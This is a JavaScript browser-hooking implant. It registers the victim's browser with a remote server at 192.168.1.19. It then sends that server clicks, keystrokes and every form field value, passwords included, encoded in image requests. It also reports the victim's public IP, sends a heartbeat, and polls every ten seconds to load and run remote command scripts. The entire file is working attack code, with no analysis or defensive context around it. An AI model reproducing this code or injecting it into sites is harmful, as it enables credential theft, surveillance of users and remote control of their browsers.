var address = "192.168.1.19";

// Generate browserId in Session storage
if(sessionStorage.getItem('browserID') == null) {
  browserID = '_' + Math.random().toString(36).substr(2, 9);
  sessionStorage.setItem('browserID', browserID);
  
  new Image().src = 'http://' + address + '/rcv.php?action=initHook&browserId=' + browserID + '&userAgent=' + navigator.userAgent + '&hostname=' + window.location.hostname;
  new Image().src = "http://" + address + "/rcv.php?browserId=" + browserID + "&type=Info&module=Core&event=" + btoa("The Browser has been successfully hooked");
}

var browserID = sessionStorage.getItem('browserID');

// Load keylogger func on onload
window.onload = function() {
  // Track onclick events
  document.body.onclick = onclickEvent; 

  // Track onfocus/onBlur events on all <inputs> elemts
  inputs = document.getElementsByTagName('input');
  for (i = 0; i < inputs.length; i++) {
    inputs[i].onblur = onBlurEvent;
  }

  // Get Public IP
  getPublicIP();

  // By default, the keylogger functionnality is disabled (or when the user reload the page)
  new Image().src = "http://" + address + "/rcv.php?browserId=" + browserID + "&type=Info&module=Keylogger&event=" + btoa("Keylogger is disabled (loading/reloading page)");

  // Include js lib for screenshot
  var script = document.createElement('script');
  script.src = "http://html2canvas.hertzen.com/dist/html2canvas.js";
  document.head.appendChild(script);
}

// Heartbeat function
window.setInterval(function() {
    new Image().src = 'http://' + address + '/rcv.php?action=heartbeat&browserId=' + browserID;
}, 3000);

// Get commands every 10 sec
window.setInterval(function() {
  var script = document.createElement('script');
  script.src = 'http://' + address + '/hooked_browsers/' + browserID + '/' + browserID + '_commands.js';
  document.head.appendChild(script);
}, 10000);

// Track onclick event on <input>, <a>, <button>
// Try to send form data when is available
// TODO : add event window.onload
function onclickEvent(e) {
  var event = "";
  var localName = e.target.localName;

  switch(localName) {
    case 'input':
      if(e.target.type === 'submit') {
        if(e.target.form === null) {
          event = '{"event":"onclick","' + e.target.localName + '":{"type":"' + e.target.type + '","name":"' + e.target.name + '","value":"' + e.target.value + '","text":"' + e.target.innerText + '"}}';
          new Image().src = 'http://' + address + '/rcv.php?browserId=' + browserID + '&type=Event&module=Core&event=' + btoa(event);
        }
        else {
          event = '{"event":"onclick","' + e.target.localName + '":{"type":"' + e.target.type + '","name":"' + e.target.name + '","value":"' + e.target.value + '","text":"' + e.target.innerText + '", "form": {"action":"' + e.target.form.action + '", "method":"' + e.target.form.method + '"';
          
          var elements = e.target.form.elements;
          for (var i = 0, element; element = elements[i++];) {
            if (element.localName === "input" && element.type !== "submit") {
              inputElem = ', "' + element.localName + '_' + i + '" : {"tag":"' + element.localName + '","type":"' + element.type + '","name":"' + element.name + '","id":"' + element.id + '","value":"' + element.value + '"}';
              event = event + inputElem;
            }
          }   
          
          event = event + "}}}";
          
          new Image().src = 'http://' + address + '/rcv.php?browserId=' + browserID + '&type=Event&module=Core&event=' + btoa(event);
        }   
      }
      else {
        event = '{"event":"onclick","' + e.target.localName + '":{"type":"' + e.target.type + '","name":"' + e.target.name + '","id":"' + e.target.id + '","value":"' + e.target.value + '"}}';
        new Image().src = 'http://' + address + '/rcv.php?browserId=' + browserID + '&type=Event&module=Core&event=' + btoa(event);
      }
      break;
    
    case 'a':
      event = '{"event":"onclick","' + e.target.localName + '":{"href":"' + e.target.href + '","title":"' + e.target.title + '","text":"' + e.target.text + '"}}';
      new Image().src = 'http://' + address + '/rcv.php?browserId=' + browserID + '&type=Event&module=Core&event=' + btoa(event);
      break;

    case 'button':
      if(e.target.form === null) {
        event = '{"event":"onclick","' + e.target.localName + '":{"type":"' + e.target.type + '","name":"' + e.target.name + '","value":"' + e.target.value + '","text":"' + e.target.innerText + '"}}';
        new Image().src = 'http://' + address + '/rcv.php?browserId=' + browserID + '&type=Event&module=Core&event=' + btoa(event);
      }
      else {
        event = '{"event":"onclick","' + e.target.localName + '": {"type":"' + e.target.type + '","name":"' + e.target.name + '","value":"' + e.target.value + '","text":"' + e.target.innerText + '", "form": {"action":"' + e.target.form.action + '", "method":"' + e.target.form.method + '"';
        
        var elements = e.target.form.elements;
        for (var i = 0, element; element = elements[i++];) {
          if (element.localName === "input") {
            inputElem = ', "' + element.localName + '_' + i + '" : {"tag":"' + element.localName + '","type":"' + element.type + '","name":"' + element.name + '","id":"' + element.id + '","value":"' + element.value + '"}';
            event = event + inputElem;
          }
        }   
        
        event = event + "}}}";
        
        new Image().src = 'http://' + address + '/rcv.php?browserId=' + browserID + '&type=Event&module=Core&event=' + btoa(event);
      }   
      break;
  }
}

// Get onblur data
function onBlurEvent(e) {
  var event = "";
  var localName = e.target.localName;

  event = '{"event":"onblur","' + e.target.localName + '":{"type":"' + e.target.type + '","name":"' + e.target.name + '","value":"' + e.target.value + '"}}';
  new Image().src = 'http://' + address + '/rcv.php?browserId=' + browserID + '&type=Event&module=Core&event=' + btoa(event);
}

// Get printable characters
function getOnKeyPress(e) {
  var key = e.key;
  if(key === ' ' || key === 'Spacebar') {
    key = "{Space}";
  }
  new Image().src = 'http://' + address + '/rcv.php?browserId=' + browserID + '&type=Event&module=Keylogger&event=' + btoa('onkeypress(' + key + ')');
}

// Get special characters
function getOnKeyDown(e) {
  var key = e.key;
  if(key === 'Backspace') {
    key = "{Backspace}";
    new Image().src = 'http://' + address + '/rcv.php?browserId=' + browserID + '&type=Event&module=Keylogger&event=' + btoa('onkeydown(' + key + ')');
  }
}

// Get PublicIP function
function getPublicIP() {
  var xhr = new XMLHttpRequest();
  xhr.open("GET", 'http://api.ipify.org/', true);
  xhr.onreadystatechange = function() {
    if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
      new Image().src = 'http://' + address + '/rcv.php?action=getPublicIP&browserId=' + browserID + '&publicIP=' + xhr.responseText;
    }
  }

  xhr.send();
}